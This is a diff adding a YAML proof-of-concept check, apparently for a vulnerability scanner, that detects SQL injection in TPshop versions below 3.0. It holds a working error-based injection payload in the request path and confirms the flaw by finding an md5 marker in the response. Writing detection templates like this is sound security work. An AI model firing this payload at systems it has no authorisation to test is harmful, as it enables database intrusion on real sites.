@@ -1,0 +1,15 @@
+name: poc-yaml-tpshop-sqli
+set:
+  r: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: >-
+      /mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select md5({{r}})),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--
+    follow_redirects: true
+    expression: |
+      response.body.bcontains(bytes(md5(string(r))))
+detail:
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  Affected Version: "tpshop<3.0"
+  links:
+    - https://xz.aliyun.com/t/6635
